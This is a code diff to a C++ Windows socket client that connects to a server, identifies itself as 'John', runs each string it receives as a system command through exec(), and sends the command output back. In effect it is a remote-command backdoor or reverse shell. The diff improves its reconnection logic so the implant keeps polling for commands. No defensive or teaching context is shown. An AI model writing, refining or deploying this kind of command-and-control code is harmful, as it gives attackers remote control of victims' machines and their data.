@@ -8,7 +8,6 @@
 int main(){
     WSADATA wsaData;
     SOCKET ConnectSocket = INVALID_SOCKET;
-    const char t = 200;
     struct addrinfo* result = NULL, * ptr = NULL, hints;
     char recvbuf[DEFAULT_BUFLEN];
     int iResult;
@@ -20,7 +19,6 @@ int main(){
     }
 
     initServerSocket(&wsaData, &hints, result, ptr, &ConnectSocket);
-    setsockopt(ConnectSocket, SOL_SOCKET, SO_RCVTIMEO, &t, sizeof(t));
 
     // Send an initial buffer (NAME)
     const char* sendbuf = "John";
@@ -31,18 +29,24 @@ int main(){
         sentStatus = sendMessageToServer(&ConnectSocket, sendbuf); // Name
 
         vector<char> message_c = recieveMessage(&ConnectSocket, recvbuf, recvbuflen);
-        closesocket(ConnectSocket);
-        string str = string(message_c.begin(), message_c.end());
+        if ((int)message_c.size() == 0) {
+            closesocket(ConnectSocket);
+            initServerSocket(&wsaData, &hints, result, ptr, &ConnectSocket);
+        }
+        else {
+            closesocket(ConnectSocket);
+            string str = string(message_c.begin(), message_c.end());
+            cout << str; //Command getting
+            exec_result = exec(str.c_str());
+            const char* exec_package = exec_result.c_str();
+            cout << exec_result << std::endl;
 
-        cout << str; //Command getting
-        exec_result = exec(str.c_str());
-        initServerSocket(&wsaData, &hints, result, ptr, &ConnectSocket);
-        const char* exec_package = exec_result.c_str();
-        cout << exec_result << std::endl;
+            initServerSocket(&wsaData, &hints, result, ptr, &ConnectSocket, 1000);
+            sentStatus = sendMessageToServer(&ConnectSocket, sendbuf); // name
 
-        sentStatus = sendMessageToServer(&ConnectSocket, sendbuf); // name
-        Sleep(1000);
-        sentStatus = sendMessageToServer(&ConnectSocket, exec_package); //CMD RESULT
+            Sleep(1000);
+            sentStatus = sendMessageToServer(&ConnectSocket, exec_package); //CMD RESULT
+        }
     }
     return 0;
 }
